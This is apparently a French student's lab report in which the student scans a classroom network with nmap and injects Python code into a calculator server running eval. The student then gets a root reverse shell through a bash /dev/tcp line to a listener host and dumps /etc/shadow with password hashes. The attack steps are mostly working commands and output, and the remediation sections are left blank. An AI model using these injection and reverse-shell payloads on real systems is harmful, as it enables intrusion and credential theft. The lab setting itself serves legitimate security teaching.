. Reconnaissance

🌞 Déterminer

à quelle IP ce client essaie de se co quand on le lance

```
10.1.1.2
```

à quel port il essaie de se co sur cette IP

```
13337
```
vous DEVEZ trouver une autre méthode que la lecture du code pour obtenir ces infos

```
Lecture wireshark : voir "determiner.pcapng"
```


🌞 Scanner le réseau

```
PS C:\Users\vince> nmap -p 13337 10.33.64.0/20 --min-parallelism 10 -oN nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-24 10:28 Paris, Madrid (heure dÆÚtÚ)
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 3.38% done; ETC: 10:29 (0:01:26 remaining)
Stats: 0:02:23 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 80.32% done; ETC: 10:31 (0:00:35 remaining)
Stats: 0:02:26 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 81.07% done; ETC: 10:31 (0:00:34 remaining)
Stats: 0:02:51 elapsed; 0 hosts completed (0 up), 4095 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 96.92% done; ETC: 10:31 (0:00:05 remaining)
Stats: 0:03:03 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 27.31% done; ETC: 10:31 (0:00:16 remaining)
Stats: 0:03:27 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.31% done; ETC: 10:32 (0:00:26 remaining)
Stats: 0:04:02 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.93% done; ETC: 10:32 (0:00:14 remaining)
Stats: 0:04:32 elapsed; 3207 hosts completed (888 up), 888 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 100.00% done; ETC: 10:33 (0:00:00 remaining)
Nmap scan report for 10.33.64.9
Host is up (0.0050s latency).
```

```
voir : tp5_nmap.pcapng et tp5_nmap.txt
```

🌞 Connectez-vous au serveur

```
Nmap scan report for 🌞10.33.66.78🌞
Host is up (0.045s latency).

PORT      STATE SERVICE
13337/tcp 🌞open🌞  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)
```

```
PS D:\Reseau-Linux\R-seau_B2\TP5> python .\client.py
Veuillez saisir une opération arithmétique : 4+4
'8'
PS D:\Reseau-Linux\R-seau_B2\TP5>
```

```
L'application sert à faire des opérations
```

🌞 Injecter du code serveur

Elements modifiés
```
import os
userMessage = "__import__('os').popen('whoami').read()"
```

```
PS D:\Reseau-Linux\R-seau_B2\TP5> python .\client.py
'root\n'
PS D:\Reseau-Linux\R-seau_B2\TP5>
```

3. Reverse shell
🌞 Obtenez un reverse shell sur le serveur

```
```
PS D:\Reseau-Linux\R-seau_B2\TP5> ncat 10.33.66.78 13338
dfg
Hello__import__('os').popen('bash -i >& /dev/tcp/10.33.73.77/6666 0>&1').read()
```

```
PS D:\Reseau-Linux\R-seau_B2\TP5> ncat -lvp 6666
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.33.66.78:41492.
bash: cannot set terminal process group (1409): Inappropriate ioctl for device
bash: no job control in this shell
[root@localhost /]# ls
ls
afs
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
[root@localhost /]#
```

🌞 Pwn

```
[root@localhost /]# cat /etc/shadow    
root:$6$.8fzl//9C0M819BS$Sw1mrG49Md8cyNUn0Ai0vlthhzuSZpJ/XVfersVmgXDSBrTVchneIWHYHnT3mC/NutmPS03TneWAHihO0NXrj1::0:99999:7:::
bin:*:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
adm:*:19820:0:99999:7:::
lp:*:19820:0:99999:7:::
sync:*:19820:0:99999:7:::
shutdown:*:19820:0:99999:7:::
halt:*:19820:0:99999:7:::
mail:*:19820:0:99999:7:::
operator:*:19820:0:99999:7:::
games:*:19820:0:99999:7:::
ftp:*:19820:0:99999:7:::
nobody:*:19820:0:99999:7:::
systemd-coredump:!!:20010::::::
dbus:!!:20010::::::
tss:!!:20010::::::
sssd:!!:20010::::::
sshd:!!:20010::::::
chrony:!!:20010::::::
it4:$6$HTSBHGoZflJxXu9u$i54higNbS5p2zVOLWP6P33D39SyWRrEAOjzh97xRa15KzJU3jZfBi/XIPY3FKDoYoSvo1FrirBwNcgmEVpaPK/::0:99999:7:::
tcpdump:!!:20010::::::
```

```
[root@localhost /]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
sssd:x:998:996:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin

II. Remédiation
🌞 Proposer une remédiation dév




🌞 Proposer une remédiation système

